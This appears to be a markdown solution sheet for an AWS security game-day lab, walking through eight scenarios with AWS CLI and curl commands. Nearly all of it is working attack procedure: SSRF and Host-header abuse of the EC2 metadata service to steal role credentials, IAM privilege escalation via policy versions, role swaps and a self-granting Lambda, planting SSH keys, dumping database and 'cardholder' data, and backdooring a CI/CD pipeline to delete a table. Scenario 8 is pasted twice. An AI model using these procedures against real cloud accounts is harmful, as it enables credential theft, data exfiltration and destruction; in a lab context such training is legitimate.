# **Scenario_1**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

### **Configure your profile**

`aws configure --profile scenario1_username`

### **Get the list of policies attached to your user**

`aws iam list-attached-user-policies --user-name <scenario1_your_username> --profile <scenario1_username>`

### **Get a policy versions** (*your_username is your name before @*)

`aws iam list-policy-versions --policy-arn <generatedARN>/<your_policy_name> --profile <scenario1_username>`

### **Describe a specific version**

`aws iam get-policy-version --policy-arn <generatedARN>/<your_policy_name> --version-id <versionID> --profile scenario1_username`

### **Please be sure that you are setting the correct version (make get-policy-versions for all policy versions)**

`aws iam set-default-policy-version --policy-arn <generatedARN>/<your_policy_name> --version-id <versionID> --profile scenario1_username`

### **Describe all available s3 buckets**

`aws s3 ls --profile scenario1_username`

### ***In case of error, set 1-st version and try again with another version***

---

# **Scenario_2**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

### **-H, --header 'Host: - Extra header to include in the request when sending HTTP to a server**

`curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'`

`Invoke-RestMethod -Proxy http://18.159.62.175 -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` - `powershel`

`curl http://18.159.62.175/latest/meta-data/iam/security-credentials/  -H "Host:169.254.169.254"` - `cmd`

### **Get security credentials**

`curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254'`

### **Configure the banking profile**

`aws configure --profile <sc2-ec2-banking>`

`aws configure set aws_session_token <your_role_token> --profile <sc2-ec2-banking>`

### **Download the cardholder data**

`aws s3 ls --profile sc2-ec2-banking`

`aws s3 sync s3://<bucket-name> ./cardholder-data --profile sc2-ec2-banking`

### **Invoke a lambda to complete the scenario_2**

`aws lambda invoke --function-name Sc2FinCheck_username --payload '{"SSN":"xxx-xx-xxx"}'  --profile scenario2_username output.json`

> #### ***In case of decoding error use the following format:***

> `aws lambda invoke --function-name Sc2FinCheck_username --payload '{"SSN":"xxx-xx-xxx"}' --profile scenario2_username --cli-binary-format raw-in-base64-out response.json`

CMD:
> `aws lambda invoke --function-name Sc2FinCheck_username --payload "{""SSN"":""xxx-xx-xxx""}" --profile scenario2_username --cli-binary-format raw-in-base64-out response.json`
---

# **Scenario_3**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

`aws configure --profile scenario3_username`

### Get lists EC2 instances, identifying target of instances

`aws ec2 describe-instances --profile scenario3_username`

`aws iam list-instance-profiles --profile scenario3_username`

### Get existing instance profiles and roles within the account

`aws iam list-roles --profile scenario3_username`

### Swap the role with the other role

`aws iam remove-role-from-instance-profile --instance-profile-name ec2-meek-instance-profile_<user_id> --role-name ec2-meek-role --profile scenario3_username`

`aws iam add-role-to-instance-profile --instance-profile-name ec2-meek-instance-profile_<user_id> --role-name ec2-deletion-role_<user_id> --profile scenario3_username`

### Create a new EC2 key pair

`aws ec2 create-key-pair --key-name <key_name> --profile scenario3_username --query 'KeyMaterial' --output text > key_name.pem`

`aws ec2 describe-subnets --profile scenario3_username`

`aws ec2 describe-security-groups --profile scenario3_username`

### Use the new EC2 instance as a staging platform

```bash
aws ec2 run-instances --image-id ami-0718a1ae90971ce4d \
--instance-type t3.micro --tag-specifications 'ResourceType=instance,Tags=[{Key=Owner,Value=<user_id>}]' \
--iam-instance-profile Arn=<instanceProfileArn> \
--key-name <key_name> \
--subnet-id <subnetId> \
--security-group-ids <securityGroupId> \
--profile scenario3_username
```

`aws ec2 describe-instances --profile scenario3_username`

`ssh -i key_name.pem ubuntu@<instancePublicDNSName>`

`sudo apt-get update`

`sudo apt-get install awscli -y`

```bash
aws ec2 describe-instances --region eu-central-1 \
--filters "Name=tag-value,Values=scenario3*" \
--query "Reservations[*].Instances[*].{InstanceId:InstanceId, Name: Tags[?Key=='Name'].Value | [0]}"
```

### **Terminate the personal (security-server) EC2 instance, completing the scenario3.**

`aws ec2 modify-instance-attribute --no-disable-api-termination --region eu-central-1 --instance-id <instance_id>`

`aws ec2 terminate-instances --instance-ids <instance_id> --region eu-central-1`

---

# **Scenario_4**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

### **Configure your profile**

`aws configure --profile scenario4_username`

### **Check Lambda Sc4***

`aws lambda list-functions --query "Functions[?starts_with(FunctionName, 'Sc4InvokeMe')]" --profile scenario4_username`

### **Configure ec2lambda profile**

`aws configure --profile ec2lambda`

### Get the IPv4 of instance

`aws ec2 describe-instances --profile ec2lambda`

### **Go to `http://<EC2 instance IP>`**

Abuse the SSRF via the "url" parameter to hit the EC2 instance metadata by going to:

`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`

And then:

`http://<EC2 instance IP>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ec2_role>`

Then Add the EC2 instance credentials to your AWS CLI credentials file

```
[ec2role]
aws_access_key_id = access_key
aws_secret_access_key = secret_key
aws_session_token = "token"
```

#### Get the admin credentials

```
aws s3 ls --profile ec2role
aws s3 ls --profile ec2role s3://sc4-secret-s3-bucket
aws s3 cp --profile ec2role s3://sc4-secret-s3-bucket/admin-user.txt .

cat admin-user.txt
```

### **Configure the admin profile**

`aws configure --profile admin`
`aws lambda list-functions --profile admin`

### **Invoke a lambda to complete the scenario_4**

`aws lambda invoke --function-name Sc4InvokeMe --payload '{"SSN":"xxx-xx-xxx"}'  --profile admin output.json
cat output.json`

> #### ***In case of decoding error use the following format:***

>`aws lambda invoke --function-name Sc4InvokeMe --payload '{"key":"xxx-xx-xxx"}' --profile admin --cli-binary-format raw-in-base64-out output.json`

CMD:
> `aws lambda invoke --function-name Sc4InvokeMe --payload "{""key"":""xxx-xx-xxx""}" --profile scenario4_username --cli-binary-format raw-in-base64-out output.json` 
---

# **Scenario_5**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

### **Configure the user profile**

`aws configure --profile scenario5_username`

### **Find the log file**

`aws s3 ls --profile scenario5_username`

`aws s3 ls s3://<bucket> --recursive --profile scenario5_username`

`aws s3 cp s3://<bucket>/sc5-lb-logs/AWSLogs/793950739751/elasticloadbalancing/eu-central-1/2019/06/19/555555555555_elasticloadbalancing_eu-central-1_app.sc5-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile scenario5_username`

`cat <file.log>`

`aws elbv2 describe-load-balancers --profile scenario5_username`

`ssh-keygen -t ed25519`

### **Find the secret admin page**

 Go to dns name of LB

 Add to DNS name of LB /XXXXXXXXXXX.html from the log file

### **Do the RCE attack**

 Do rock

`echo "your public ssh key" >> /home/ubuntu/.ssh/authorized_keys`

#### Get the ip-address of current EC2 instance

`curl ifconfig.me`

`ssh -i <path_to_private_ssh_key> ubuntu@<ipv4_address>`

#### User access a private S3 bucket

`aws s3 ls`

`aws s3 ls s3://<bucket> --recursive`

`aws s3 cp s3://<bucket>/db.txt`

`cat db.txt`

### **Get the secret text stored in the RDS database**

`aws rds describe-db-instances --region eu-central-1`

`psql postgresql://<db_user>:<db_password>@<rds-instance-address>:5432/<db_name>`

`\dt`

`select * from sensitive_information;`

### **Invoke a lambda to complete the scenario_5**

`aws lambda invoke --function-name sc5_complete_user_id --payload '{"key":"Name_SurnameXXXXXXXXXXXX"}' --profile scenario5_username response.json`

> #### ***In case of decoding error use the following format:***

>`aws lambda invoke --function-name sc5_complete_user_id --payload '{"key":"Name_SurnameXXXXXXXXXXXX"}' --profile scenario5_username --cli-binary-format raw-in-base64-out response.json`

CMD:
> `aws lambda invoke --function-name sc5_complete_user_id --payload "{""key"":""Name_SurnameXXXXXXXXXXXX""}" --profile scenario5_username --cli-binary-format raw-in-base64-out response.json`
---

# **Scenario_6**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

### **Configure your profile**

`aws configure --profile scenario6_username`

### **Describe the SSM parameters**

`aws ssm describe-parameters --profile scenario6_username`

### **Get the keys**

`aws ssm get-parameter --name <sc6-ec2-private-key> --profile scenario6_username`

`echo -e "<private key>" > ec2_ssh_key

`aws ssm get-parameter --name <sc6-ec2-public-key> --profile scenario6_username`

`echo -e "<public key>" > ec2_ssh_key.pub`

### **Replace \n in key files**
`cat ec2_ssh_key | sed -e 's/\\n/\n/g' > key.pem`
`chmod 400 key.pem `

### **Get the list of all EC2 virtual machine**

`aws ec2 describe-instances --profile scenario6_username`

### **Conect to EC2 virtual machine**

`ssh -i key.pem ubuntu@<instance ip>`

### **Do from ec2 instance:**

- `aws lambda list-functions --region eu-central-1`

- `aws lambda get-function --function-name sc6-lambda --region eu-central-1`

- `aws rds describe-db-instances --region eu-central-1`

---
### Or use EC2 Metadata
- `curl http://169.254.169.254/latest/user-data`

- `psql -h <rds-instance-address> -U <db_name>> -d <db_user>` or `psql postgresql://<db_user>:<db_password>@<rds-instance-address>:5432/<db_name>`

- `/d`

- `select * from sensitive_information;`

### **Invoke a lambda to complete the scenario_6**

`aws lambda invoke --function-name sc6_complete_<username> --payload '{"key":"usernamexxxxxxxxxxxxxxxx"}' --profile scenario6_username response.json`

> #### ***In case of decoding error use the following format:***

> `aws lambda invoke --function-name sc6_complete_<username> --payload '{"key":"usernamexxxxxxxxxxxxxxxx"}' --profile scenario6_username --cli-binary-format raw-in-base64-out response.json`

CMD:
> `aws lambda invoke --function-name sc6_complete_<username> --payload "{""key"":""usernamexxxxxxxxxxxxxxxx""}" --profile scenario6_username --cli-binary-format raw-in-base64-out response.json` 

---

# **Scenario_7**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>  

### **Configure your profile**

`aws configure --profile scenario7_<user_id>`

`aws iam list-attached-user-policies --user-name <username_from_mail> --profile scenario7_<user_id>`

`aws iam get-policy-version --policy-arn <user-policy arn> --version-id v1 --profile scenario7_<user_id>`

`aws iam list-roles --profile scenario7_<user_id>`

`aws iam list-attached-role-policies --role-name LamdaExecution-role-<user_id> --profile scenario7_<user_id>`

`aws iam list-attached-role-policies --role-name LambdaManager-role-<username_from_mail> --profile scenario7_<user_id>`

`aws iam get-policy-version --policy-arn <LambdaManager-policy arn> --version-id v1 --profile scenario7_<user_id>`

`aws sts assume-role --role-arn <LambdaManager-role arn> --role-session-name LambdaManager --profile scenario7_<user_id>`

Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials`) as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

python code:

**Note**: The name of the file needs to be `lambda_function.py`.

````
import boto3
def lambda_handler(event, context):
 client = boto3.client('iam')
 response = client.attach_user_policy(UserName = '<username_from_mail>', PolicyArn='<arn_from_mail>')
 return response
````

**Note**: The function name needs to be `Sc7FinalLambda<userid>`.
`aws lambda create-function --function-name Sc7FinalLambda<userid> --runtime python3.6 --role < LamdaExecution-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager`

`aws lambda invoke --function-name Sc7FinalLambda<userid> out.txt --profile lambdaManager`

# If you have error try to use

`aws lambda invoke --function-name Sc7FinalLambda<userid> --profile lambdaManager --cli-binary-format raw-in-base64-out response.json`

`aws s3 ls --profile scenario7_<user_id>`
# Lambda invoke examples
## git cli 
aws lambda invoke --function-name Sc7FinalLambda<userid> --profile lambdaManager --cli-binary-format raw-in-base64-out response.json

## ubuntu/powershell 
aws lambda invoke --function-name Sc7FinalLambda<userid> --profile lambdaManager --cli-binary-format raw-in-base64-out response.json

---

# **Scenario_8**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.html>

## **Configure your profile**

`aws configure --profile scenario8_<user_id>`

### **Get user policy**

`aws iam list-user-policies --user-name scenario8_<user_id> --profile scenario8_<user_id>`

`aws iam get-user-policy --user-name scenario8_<user_id> --policy-name scenario8-user-policy-<user_id> --profile scenario8_<user_id>`

**Note**: Note that the IAM policy attached to your user allows it to get a SSM parameters tagged with `Environment=sandbox`, and to manage tags tagged with `Environment=dev`.

`aws ssm describe-parameters --profile scenario8_<user_id>`

`aws ssm list-tags-for-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --profile scenario8_<user_id>`

### **Change tags, get ssm parameter git_access_key**  

`aws ssm add-tags-to-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --tags "Key=Environment,Value=sandbox" --profile scenario8_<user_id>`

`aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id>`

## Step 3

Set up your local environment to clone the repository. In short:

- Copy the SSH key to your local machine (e.g. `.ssh/stolen_key`) and `chmod 700` it

- Use the following SSH configuration (in your `.ssh/config`):

```bash
Host <EC2_IP_ADDRESS>
 IdentityFile ~/.ssh/stolen_key
```

- Then, clone the repository using `git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`  

Quick variant:  

- `aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id> > stolen.key`

- `GIT_SSH_COMMAND='ssh -i stolen.key -o IdentitiesOnly=yes' git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`

## Step 4

The repository contains the backend code of the Lambda function exposed through the API gateway. Check the commit history to note a leaked access token:  

`cd scenario8_<user_id>`  
`git log`  
`git show .....`

```diff
commit 0ca720ac2d27ae5a3a1b05ebe2c7f18aeba82b75 (HEAD -> main, origin/main, origin/HEAD)
Author: .....
Date:   .....

    buildspec.yml file - hardcoded keys removed

diff --git a/buildspec.yml b/buildspec.yml
index cce1afe..58059b8 100644
--- a/buildspec.yml
+++ b/buildspec.yml
@@ -8,9 +8,9 @@ phases:
     commands:
     - echo $LAMBDA_TASK_ROOT
     - echo "Get source from GitLab repository"
-    - git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git
+    - git clone http://$USER:$TOKEN@$ADDRESS/root/scenario8_$USERID.git
     - echo "Building Docker image"
-    - docker build ./scenario8_<user_id> -t $ECR_REPOSITORY:latest
+    - docker build ./scenario8_$USERID -t $ECR_REPOSITORY:latest
   post_build:
     commands:
     - echo "Pushing Docker image to ECR"
```

## Step 5

These credentials you found belong to the user `developer_<user_id>`, who has pull and push access to this repository. Use this access to backdoor the application and delete table with the sensitive data that customers are sending to the API!

- Clone repository again with developer token:  

`git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git`  

`cd scenario8_<user_id>`

- For instance, add a piece of code into app.py that delete targetdb-<user_id> table with data:

`table.delete()`

```diff --git a/app.py b/app.py
new file mode 100644
index 0000000..ed7fbfc
--- /dev/null
+++ b/app.py
@@ -0,0 +1,70 @@
import json
import boto3
from boto3.dynamodb.conditions import Attr
from decimal import Decimal

dynamodb = boto3.resource('dynamodb')

table = dynamodb.Table('targetdb-<user_id>')
+table.delete()
def handle(event):
```

- Commit the file and push it:

`git commit -am "some changes"`  

`git push`

Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. After a few minutes, your backdoored application will be deployed, table deleted and your will receive the flag!

---

# **Scenario_8**

  Dashboard  <https://gameday-dashboard.s3.eu-central-1.amazonaws.com/index.htm>

## **Configure your profile**

`aws configure --profile scenario8_<user_id>`

### **Get user policy**

`aws iam list-user-policies --user-name scenario8_<user_id> --profile scenario8_<user_id>`

`aws iam get-user-policy --user-name scenario8_<user_id> --policy-name scenario8-user-policy-<user_id> --profile scenario8_<user_id>`

**Note**: Note that the IAM policy attached to your user allows it to get a SSM parameters tagged with `Environment=sandbox`, and to manage tags tagged with `Environment=dev`.

`aws ssm describe-parameters --profile scenario8_<user_id>`

`aws ssm list-tags-for-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --profile scenario8_<user_id>`

### **Change tags, get ssm parameter git_access_key**  

`aws ssm add-tags-to-resource --resource-type "Parameter" --resource-id "git_access_key_for_sc8_ro_user_<user_id>" --tags "Key=Environment,Value=sandbox" --profile scenario8_<user_id>`

`aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id>`

## Step 3

Set up your local environment to clone the repository. In short:

- Copy the SSH key to your local machine (e.g. `.ssh/stolen_key`) and `chmod 700` it

- Use the following SSH configuration (in your `.ssh/config`):

```bash
Host <EC2_IP_ADDRESS>
 IdentityFile ~/.ssh/stolen_key
```

- Then, clone the repository using `git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`  

Quick variant:  

- `aws ssm get-parameter --name git_access_key_for_sc8_ro_user_<user_id> --query Parameter.Value --output text --profile scenario8_<user_id> > stolen.key`

- `GIT_SSH_COMMAND='ssh -i stolen.key -o IdentitiesOnly=yes' git clone git@GIT_IP_ADDRESS:root/scenario8_<user_id>.git`

## Step 4

The repository contains the backend code of the Lambda function exposed through the API gateway. Check the commit history to note a leaked access token:  

`cd scenario8_<user_id>`  
`git log`  
`git show .....`

```diff
commit 0ca720ac2d27ae5a3a1b05ebe2c7f18aeba82b75 (HEAD -> main, origin/main, origin/HEAD)
Author: .....
Date:   .....

    buildspec.yml file - hardcoded keys removed

diff --git a/buildspec.yml b/buildspec.yml
index cce1afe..58059b8 100644
--- a/buildspec.yml
+++ b/buildspec.yml
@@ -8,9 +8,9 @@ phases:
     commands:
     - echo $LAMBDA_TASK_ROOT
     - echo "Get source from GitLab repository"
-    - git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git
+    - git clone http://$USER:$TOKEN@$ADDRESS/root/scenario8_$USERID.git
     - echo "Building Docker image"
-    - docker build ./scenario8_<user_id> -t $ECR_REPOSITORY:latest
+    - docker build ./scenario8_$USERID -t $ECR_REPOSITORY:latest
   post_build:
     commands:
     - echo "Pushing Docker image to ECR"
```

## Step 5

These credentials you found belong to the user `developer_<user_id>`, who has pull and push access to this repository. Use this access to backdoor the application and delete table with the sensitive data that customers are sending to the API!

- Clone repository again with developer token:  

`git clone http://developer_<user_id>:<token>@<EC2_IP_ADDRESS>/root/scenario8_<user_id>.git`  

`cd scenario8_<user_id>`

- For instance, add a piece of code into app.py that delete targetdb-<user_id> table with data:

`table.delete()`

```diff --git a/app.py b/app.py
new file mode 100644
index 0000000..ed7fbfc
--- /dev/null
+++ b/app.py
@@ -0,0 +1,70 @@
import json
import boto3
from boto3.dynamodb.conditions import Attr
from decimal import Decimal

dynamodb = boto3.resource('dynamodb')

table = dynamodb.Table('targetdb-<user_id>')
+table.delete()
def handle(event):
```

- Commit the file and push it:

`git commit -am "some changes"`  

`git push`

Note that the application is automatically being built by a CI/CD pipeline in CodePipeline. After a few minutes, your backdoored application will be deployed, table deleted and your will receive the flag!
